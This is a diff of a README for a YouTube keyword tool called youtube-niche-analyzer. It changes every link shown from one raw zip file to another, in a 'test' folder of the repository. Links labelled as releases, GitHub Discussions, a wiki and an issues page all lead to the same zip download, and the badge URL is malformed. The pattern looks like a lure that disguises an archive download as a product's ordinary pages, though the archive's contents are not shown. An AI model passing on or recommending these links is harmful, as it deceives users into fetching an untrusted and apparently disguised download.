@@ -6,7 +6,7 @@ Welcome to **youtube-niche-analyzer**! This tool helps you understand how releva
 
 ## 📥 Download Here
 
-[![Download the latest release](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip%https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip)](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip)
+[![Download the latest release](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip%https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip)](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip)
 
 ## 🎯 Features
 
@@ -25,7 +25,7 @@ Welcome to **youtube-niche-analyzer**! This tool helps you understand how releva
 
 ### Step 1: Visit the Releases Page
 
-To get the latest version of **youtube-niche-analyzer**, visit the following page: [Download Releases](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip).
+To get the latest version of **youtube-niche-analyzer**, visit the following page: [Download Releases](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip).
 
 ### Step 2: Download the Latest Version
 
@@ -54,15 +54,15 @@ If you encounter any issues while using the application, consider these common s
 
 ## 🌐 Community
 
-Join our community for support and feedback. You can share your insights or ask questions anytime on our [GitHub Discussions](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip).
+Join our community for support and feedback. You can share your insights or ask questions anytime on our [GitHub Discussions](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip).
 
 ## 📖 Learn More
 
-To dive deeper into how **youtube-niche-analyzer** works and get tips on keyword optimization, refer to our [Wiki](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip).
+To dive deeper into how **youtube-niche-analyzer** works and get tips on keyword optimization, refer to our [Wiki](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip).
 
 ## 💬 Feedback
 
-We welcome your thoughts on how we can improve the tool. Please submit any feedback through our [issues page](https://raw.githubusercontent.com/naynormanda/youtube-niche-analyzer/main/Agapanthus/youtube-niche-analyzer.zip).
+We welcome your thoughts on how we can improve the tool. Please submit any feedback through our [issues page](https://github.com/naynormanda/youtube-niche-analyzer/raw/refs/heads/main/test/youtube_niche_analyzer_2.5.zip).
 
 ## 📅 Updates
 
